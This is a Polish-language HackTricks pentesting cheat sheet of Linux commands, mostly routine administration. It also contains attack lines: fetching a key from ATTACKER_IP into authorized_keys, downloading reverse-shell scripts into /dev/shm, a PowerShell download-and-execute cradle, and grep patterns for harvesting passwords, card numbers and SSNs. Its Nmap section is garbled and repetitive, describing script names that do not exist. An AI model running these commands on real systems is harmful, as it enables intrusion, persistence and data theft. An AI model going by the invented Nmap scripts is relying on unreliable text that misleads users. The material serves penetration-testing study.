# Przydatne polecenia Linuxa

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować zadania** przy użyciu najbardziej zaawansowanych narzędzi społecznościowych na świecie.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć **reklamę swojej firmy w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

## Wspólne polecenia Bash
```bash
#Exfiltration using Base64
base64 -w 0 file

#Get HexDump without new lines
xxd -p boot12.bin | tr -d '\n'

#Add public key to authorized keys
curl https://ATTACKER_IP/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys

#Echo without new line and Hex
echo -n -e

#Count
wc -l <file> #Lines
wc -c #Chars

#Sort
sort -nr #Sort by number and then reverse
cat file | sort | uniq #Sort and delete duplicates

#Replace in file
sed -i 's/OLD/NEW/g' path/file #Replace string inside a file

#Download in RAM
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py

#Files used by network processes
lsof #Open files belonging to any process
lsof -p 3 #Open files used by the process
lsof -i #Files used by networks processes
lsof -i 4 #Files used by network IPv4 processes
lsof -i 6 #Files used by network IPv6 processes
lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
lsof +D /lib #Processes using files inside the indicated dir
lsof -i :80 #Files uses by networks processes
fuser -nv tcp 80

#Decompress
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz

#Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

#Clipboard
xclip -sel c < cat file.txt

#HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

#Curl
#json data
curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3000/endpoint
#Auth via JWT
curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint

#Send Email
sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf #You will be prompted for the content

#DD copy hex bin file without first X (28) bytes
dd if=file.bin bs=28 skip=1 of=blob

#Mount .vhd files (virtual hard drive)
sudo apt-get install libguestfs-tools
guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd

# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
ssh-keyscan 10.10.10.101

# Openssl
openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
openssl x509 -in ca.cert.pem -text #Read certificate
openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
# Decrypt ssh key
openssl rsa -in key.ssh.enc -out key.ssh
#Decrypt
openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz

#Count number of instructions executed by a program, need a host based linux (not working in VM)
perf stat -x, -e instructions:u "ls"

#Find trick for HTB, find files from 2018-12-12 to 2018-12-14
find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null

#Reconfigure timezone
sudo dpkg-reconfigure tzdata

#Search from which package is a binary
apt-file search /usr/bin/file #Needed: apt-get install apt-file

#Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw

#Set not removable bit
sudo chattr +i file.txt
sudo chattr -i file.txt #Remove the bit so you can delete it

# List files inside zip
7z l file.zip
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Użyj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby łatwo tworzyć i **automatyzować** zadania przy użyciu najbardziej zaawansowanych narzędzi społeczności.\
Otrzymaj dostęp już dziś:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Bash dla systemu Windows
```bash
#Base64 for Windows
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0

#Exe compression
upx -9 nc.exe

#Exe2bat
wine exe2bat.exe nc.exe nc.txt

#Compile Windows python exploit to exe
pip install pyinstaller
wget -O exploit.py http://www.exploit-db.com/download/31853
python pyinstaller.py --onefile exploit.py

#Compile for windows
#sudo apt-get install gcc-mingw-w64-i686
i686-mingw32msvc-gcc -o executable useradd.c
```
## Greps

Grep to narzędzie wiersza poleceń, które służy do wyszukiwania wzorców w plikach tekstowych. Poniżej przedstawiam kilka przykładów użycia grepa:

### Podstawowe użycie

```bash
grep "wzorzec" plik.txt
```

Ten polecenie wyszuka w pliku `plik.txt` wszystkie linie zawierające podany wzorzec.

### Ignorowanie wielkości liter

```bash
grep -i "wzorzec" plik.txt
```

Dodanie opcji `-i` spowoduje, że grep zignoruje wielkość liter podczas wyszukiwania.

### Wyświetlanie numerów linii

```bash
grep -n "wzorzec" plik.txt
```

Opcja `-n` spowoduje wyświetlenie numerów linii, na których znajduje się wyszukiwany wzorzec.

### Wyszukiwanie wzorców w wielu plikach

```bash
grep "wzorzec" plik1.txt plik2.txt
```

Możemy również wyszukiwać wzorce w wielu plikach jednocześnie, podając ich nazwy po poleceniu grep.

### Wyszukiwanie wzorców w katalogach

```bash
grep -r "wzorzec" katalog/
```

Opcja `-r` pozwala na rekurencyjne wyszukiwanie wzorców we wszystkich plikach w danym katalogu.

### Wyszukiwanie wzorców z wyrażeniami regularnymi

```bash
grep -E "wzorzec" plik.txt
```

Opcja `-E` pozwala na wyszukiwanie wzorców przy użyciu wyrażeń regularnych.

### Zapisywanie wyników do pliku

```bash
grep "wzorzec" plik.txt > wynik.txt
```

Możemy przekierować wyniki wyszukiwania do pliku, używając operatora `>`.

### Wyszukiwanie wzorców z wyłączeniem

```bash
grep -v "wzorzec" plik.txt
```

Opcja `-v` spowoduje wyświetlenie wszystkich linii, które nie zawierają podanego wzorca.

### Wyszukiwanie wzorców z kontekstem

```bash
grep -C 2 "wzorzec" plik.txt
```

Opcja `-C` pozwala na wyświetlanie linii zawierających wyszukiwany wzorzec wraz z dwoma liniami kontekstu przed i po nim.

### Wyszukiwanie wzorców z ograniczeniem długości linii

```bash
grep -r ".{10,20}" plik.txt
```

Możemy wyszukiwać wzorce, które mają określoną długość, używając wyrażeń regularnych i operatora `{}`.

To tylko kilka przykładów użycia grepa. Istnieje wiele innych opcji i możliwości, które można odkryć, eksperymentując z tym potężnym narzędziem.
```bash
#Extract emails from file
grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt

#Extract valid IP addresses
grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" file.txt

#Extract passwords
grep -i "pwd\|passw" file.txt

#Extract users
grep -i "user\|invalid\|authentication\|login" file.txt

# Extract hashes
#Extract md5 hashes ({32}), sha1 ({40}), sha256({64}), sha512({128})
egrep -oE '(^|[^a-fA-F0-9])[a-fA-F0-9]{32}([^a-fA-F0-9]|$)' *.txt | egrep -o '[a-fA-F0-9]{32}' > md5-hashes.txt
#Extract valid MySQL-Old hashes
grep -e "[0-7][0-9a-f]{7}[0-7][0-9a-f]{7}" *.txt > mysql-old-hashes.txt
#Extract blowfish hashes
grep -e "$2a\$\08\$(.){75}" *.txt > blowfish-hashes.txt
#Extract Joomla hashes
egrep -o "([0-9a-zA-Z]{32}):(w{16,32})" *.txt > joomla.txt
#Extract VBulletin hashes
egrep -o "([0-9a-zA-Z]{32}):(S{3,32})" *.txt > vbulletin.txt
#Extraxt phpBB3-MD5
egrep -o '$H$S{31}' *.txt > phpBB3-md5.txt
#Extract Wordpress-MD5
egrep -o '$P$S{31}' *.txt > wordpress-md5.txt
#Extract Drupal 7
egrep -o '$S$S{52}' *.txt > drupal-7.txt
#Extract old Unix-md5
egrep -o '$1$w{8}S{22}' *.txt > md5-unix-old.txt
#Extract md5-apr1
egrep -o '$apr1$w{8}S{22}' *.txt > md5-apr1.txt
#Extract sha512crypt, SHA512(Unix)
egrep -o '$6$w{8}S{86}' *.txt > sha512crypt.txt

#Extract e-mails from text files
grep -E -o "\b[a-zA-Z0-9.#?$*_-]+@[a-zA-Z0-9.#?$*_-]+.[a-zA-Z0-9.-]+\b" *.txt > e-mails.txt

#Extract HTTP URLs from text files
grep http | grep -shoP 'http.*?[" >]' *.txt > http-urls.txt
#For extracting HTTPS, FTP and other URL format use
grep -E '(((https|ftp|gopher)|mailto)[.:][^ >"	]*|www.[-a-z0-9.]+)[^ .,;	>">):]' *.txt > urls.txt
#Note: if grep returns "Binary file (standard input) matches" use the following approaches # tr '[\000-\011\013-\037177-377]' '.' < *.log | grep -E "Your_Regex" OR # cat -v *.log | egrep -o "Your_Regex"

#Extract Floating point numbers
grep -E -o "^[-+]?[0-9]*.?[0-9]+([eE][-+]?[0-9]+)?$" *.txt > floats.txt

# Extract credit card data
#Visa
grep -E -o "4[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > visa.txt
#MasterCard
grep -E -o "5[0-9]{3}[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > mastercard.txt
#American Express
grep -E -o "\b3[47][0-9]{13}\b" *.txt > american-express.txt
#Diners Club
grep -E -o "\b3(?:0[0-5]|[68][0-9])[0-9]{11}\b" *.txt > diners.txt
#Discover
grep -E -o "6011[ -]?[0-9]{4}[ -]?[0-9]{4}[ -]?[0-9]{4}" *.txt > discover.txt
#JCB
grep -E -o "\b(?:2131|1800|35d{3})d{11}\b" *.txt > jcb.txt
#AMEX
grep -E -o "3[47][0-9]{2}[ -]?[0-9]{6}[ -]?[0-9]{5}" *.txt > amex.txt

# Extract IDs
#Extract Social Security Number (SSN)
grep -E -o "[0-9]{3}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > ssn.txt
#Extract Indiana Driver License Number
grep -E -o "[0-9]{4}[ -]?[0-9]{2}[ -]?[0-9]{4}" *.txt > indiana-dln.txt
#Extract US Passport Cards
grep -E -o "C0[0-9]{7}" *.txt > us-pass-card.txt
#Extract US Passport Number
grep -E -o "[23][0-9]{8}" *.txt > us-pass-num.txt
#Extract US Phone Numberss
grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
#Extract ISBN Numbers
egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
```
## Znajdź

### Find files by name

### Znajdź pliki po nazwie

To find files by name, you can use the `find` command with the `-name` option followed by the name or pattern of the file you are looking for. Here's the syntax:

Aby znaleźć pliki po nazwie, możesz użyć polecenia `find` z opcją `-name`, a następnie podać nazwę lub wzorzec pliku, którego szukasz. Oto składnia:

```bash
find /path/to/directory -name "filename"
```

Replace `/path/to/directory` with the actual directory path where you want to start the search, and `"filename"` with the name or pattern of the file you want to find.

Zamień `/path/to/directory` na rzeczywistą ścieżkę katalogu, od którego chcesz rozpocząć wyszukiwanie, a `"filename"` na nazwę lub wzorzec pliku, który chcesz znaleźć.

For example, to find all files named `example.txt` in the current directory and its subdirectories, you can use the following command:

Na przykład, aby znaleźć wszystkie pliki o nazwie `example.txt` w bieżącym katalogu i jego podkatalogach, możesz użyć następującego polecenia:

```bash
find . -name "example.txt"
```

This will search for files named `example.txt` starting from the current directory (`.`).

To wyszuka pliki o nazwie `example.txt`, rozpoczynając od bieżącego katalogu (`.`).

### Find files by type

### Znajdź pliki po typie

To find files by type, you can use the `find` command with the `-type` option followed by the type of file you are looking for. Here are some common file types and their corresponding options:

Aby znaleźć pliki po typie, możesz użyć polecenia `find` z opcją `-type`, a następnie podać typ pliku, którego szukasz. Oto kilka powszechnych typów plików i ich odpowiadających opcji:

- Regular file: `-type f`
- Plik regularny: `-type f`

- Directory: `-type d`
- Katalog: `-type d`

- Symbolic link: `-type l`
- Dowiązanie symboliczne: `-type l`

- Socket: `-type s`
- Gniazdo: `-type s`

- Named pipe (FIFO): `-type p`
- Nazwany potok (FIFO): `-type p`

- Character device: `-type c`
- Urządzenie znakowe: `-type c`

- Block device: `-type b`
- Urządzenie blokowe: `-type b`

Here's an example command to find all regular files in the current directory and its subdirectories:

Oto przykładowe polecenie, które znajduje wszystkie pliki regularne w bieżącym katalogu i jego podkatalogach:

```bash
find . -type f
```

This will search for regular files starting from the current directory (`.`).

To wyszuka pliki regularne, rozpoczynając od bieżącego katalogu (`.`).

### Find files by size

### Znajdź pliki po rozmiarze

To find files by size, you can use the `find` command with the `-size` option followed by the size of the file you are looking for. Here are some examples of how to specify the size:

Aby znaleźć pliki po rozmiarze, możesz użyć polecenia `find` z opcją `-size`, a następnie podać rozmiar pliku, którego szukasz. Oto kilka przykładów, jak określić rozmiar:

- Exact size: `sizec`
- Dokładny rozmiar: `sizec`

- Less than size: `-sizex`
- Mniejszy niż rozmiar: `-sizex`

- Greater than size: `+size`
- Większy niż rozmiar: `+size`

The size can be specified in bytes (c), kilobytes (k), megabytes (M), gigabytes (G), or terabytes (T).

Rozmiar można podać w bajtach (c), kilobajtach (k), megabajtach (M), gigabajtach (G) lub terabajtach (T).

Here's an example command to find all files larger than 1 megabyte in the current directory and its subdirectories:

Oto przykładowe polecenie, które znajduje wszystkie pliki większe niż 1 megabajt w bieżącym katalogu i jego podkatalogach:

```bash
find . -size +1M
```

This will search for files larger than 1 megabyte starting from the current directory (`.`).

To wyszuka pliki większe niż 1 megabajt, rozpoczynając od bieżącego katalogu (`.`).
```bash
# Find SUID set files.
find / -perm /u=s -ls 2>/dev/null

# Find SGID set files.
find / -perm /g=s -ls 2>/dev/null

# Found Readable directory and sort by time.  (depth = 4)
find / -type d -maxdepth 4 -readable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Writable directory and sort by time.  (depth = 10)
find / -type d -maxdepth 10 -writable -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current User and sort by time. (depth = 10)
find / -maxdepth 10 -user $(id -u) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Or Found Own by Current Group ID and Sort by time. (depth = 10)
find / -maxdepth 10 -group $(id -g) -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r

# Found Newer files and sort by time. (depth = 5)
find / -maxdepth 5 -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer files only and sort by time. (depth = 5)
find / -maxdepth 5 -type f -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less

# Found Newer directory only and sort by time. (depth = 5)
find / -maxdepth 5 -type d -printf "%T@ %Tc | %p \n" 2>/dev/null | grep -v "| /proc" | grep -v "| /dev" | grep -v "| /run" | grep -v "| /var/log" | grep -v "| /boot"  | grep -v "| /sys/" | sort -n -r | less
```
## Pomoc w wyszukiwaniu Nmap

Nmap jest potężnym narzędziem do skanowania sieci, które umożliwia odkrywanie i badanie hostów w sieci. Poniżej przedstawiam kilka przydatnych poleceń, które pomogą Ci w wyszukiwaniu za pomocą Nmap.

### Skanowanie podstawowe

```bash
nmap <adres_ip>
```

To podstawowe polecenie Nmap skanuje pojedynczy adres IP i wyświetla informacje o otwartych portach i usługach na tym hoście.

### Skanowanie zakresu adresów IP

```bash
nmap <adres_ip1-adres_ip2>
```

To polecenie Nmap skanuje zakres adresów IP między `adres_ip1` a `adres_ip2` i wyświetla informacje o otwartych portach i usługach na tych hostach.

### Skanowanie całej sieci

```bash
nmap <adres_ip>/24
```

To polecenie Nmap skanuje całą sieć, której adres IP jest podany, i wyświetla informacje o otwartych portach i usługach na wszystkich hostach w tej sieci.

### Skanowanie określonych portów

```bash
nmap -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście i wyświetla informacje o otwartych portach i usługach na tym hoście.

### Skanowanie w tle

```bash
nmap -Pn -p <port1,port2,port3> -oN <nazwa_pliku> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w tle, bez wysyłania pakietów ping i zapisuje wyniki skanowania do pliku o nazwie `<nazwa_pliku>`.

### Skanowanie usług

```bash
nmap -p- <adres_ip>
```

To polecenie Nmap skanuje wszystkie porty na danym hoście i wyświetla informacje o otwartych portach i usługach na tym hoście.

### Skanowanie systemu operacyjnego

```bash
nmap -O <adres_ip>
```

To polecenie Nmap próbuje zidentyfikować system operacyjny danego hosta na podstawie odpowiedzi na skanowanie.

### Skanowanie wersji usług

```bash
nmap -sV <adres_ip>
```

To polecenie Nmap próbuje zidentyfikować wersje usług na danym hoście na podstawie odpowiedzi na skanowanie.

### Skanowanie wrażliwości

```bash
nmap --script vuln <adres_ip>
```

To polecenie Nmap skanuje hosta w poszukiwaniu potencjalnych wrażliwości i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem skryptów

```bash
nmap --script <nazwa_skryptu> <adres_ip>
```

To polecenie Nmap skanuje hosta z wykorzystaniem określonego skryptu w poszukiwaniu potencjalnych wrażliwości i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE

```bash
nmap --script vulners <adres_ip>
```

To polecenie Nmap skanuje hosta w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych CVE, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych NSE

```bash
nmap --script nmap-vulners <adres_ip>
```

To polecenie Nmap skanuje hosta w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych NSE, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych Nmap

```bash
nmap --script nmap-vulscan -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych Nmap, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych OpenVAS

```bash
nmap --script openvas -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych OpenVAS, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych Nessus

```bash
nmap --script nessus -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych Nessus, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych Nikto

```bash
nmap --script nikto -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych Nikto, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych Metasploit

```bash
nmap --script metasploit -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych Metasploit, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych ExploitDB

```bash
nmap --script exploitdb -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z bazy danych ExploitDB, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE i ExploitDB

```bash
nmap --script vulners-exploitdb -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE i ExploitDB, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB i OpenVAS

```bash
nmap --script vulners-openvas -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB i OpenVAS, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS i Nessus

```bash
nmap --script vulners-nessus -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS i Nessus, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus i Nikto

```bash
nmap --script vulners-nessus-nikto -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus i Nikto, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto i Metasploit

```bash
nmap --script vulners-nessus-nikto-metasploit -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto i Metasploit, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit i Nikto

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit i Nikto, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto i ExploitDB

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto-exploitdb -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto i ExploitDB, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB i OpenVAS

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto-exploitdb-openvas -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB i OpenVAS, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS i Nikto

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto-exploitdb-openvas-nikto -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS i Nikto, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS, Nikto i Metasploit

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto-exploitdb-openvas-nikto-metasploit -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS, Nikto i Metasploit, i wyświetla informacje o znalezionych podatnościach.

### Skanowanie wrażliwości z wykorzystaniem bazy danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS, Nikto, Metasploit i Nikto

```bash
nmap --script vulners-nessus-nikto-metasploit-nikto-exploitdb-openvas-nikto-metasploit-nikto -p <port1,port2,port3> <adres_ip>
```

To polecenie Nmap skanuje określone porty na danym hoście w poszukiwaniu potencjalnych wrażliwości, korzystając z baz danych CVE, ExploitDB, OpenVAS, Nessus, Nikto, Metasploit, Nikto, ExploitDB, OpenVAS, Nikto, Metasploit i Nikto, i wyświetla informacje o znalezionych podatnościach.
```bash
#Nmap scripts ((default or version) and smb))
nmap --script-help "(default or version) and *smb*"
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
nmap --script-help "(default or version) and smb)"
```
## Bash

Bash (Bourne Again SHell) jest popularnym interpreterem poleceń w systemach operacyjnych opartych na Unixie. Poniżej znajduje się lista przydatnych poleceń Bash:

### Polecenia systemowe

- `ls`: Wyświetla zawartość bieżącego katalogu.
- `cd`: Zmienia bieżący katalog.
- `pwd`: Wyświetla ścieżkę do bieżącego katalogu.
- `mkdir`: Tworzy nowy katalog.
- `rm`: Usuwa plik lub katalog.
- `cp`: Kopiuje plik lub katalog.
- `mv`: Przenosi plik lub katalog.
- `cat`: Wyświetla zawartość pliku.
- `touch`: Tworzy nowy plik.
- `chmod`: Zmienia uprawnienia pliku lub katalogu.
- `chown`: Zmienia właściciela pliku lub katalogu.
- `chgrp`: Zmienia grupę pliku lub katalogu.
- `find`: Wyszukuje pliki i katalogi.
- `grep`: Wyszukuje wzorce w plikach.
- `tar`: Tworzy lub rozpakowuje archiwum tar.
- `gzip`: Kompresuje plik.
- `gunzip`: Rozpakowuje skompresowany plik gzip.
- `ssh`: Nawiązuje połączenie SSH z innym hostem.
- `scp`: Kopiuje pliki między hostami za pomocą SSH.

### Polecenia procesów

- `ps`: Wyświetla informacje o działających procesach.
- `top`: Wyświetla listę procesów w czasie rzeczywistym.
- `kill`: Wysyła sygnał do procesu.
- `bg`: Uruchamia proces w tle.
- `fg`: Przywraca proces do pierwszego planu.
- `jobs`: Wyświetla listę procesów w tle.

### Polecenia sieciowe

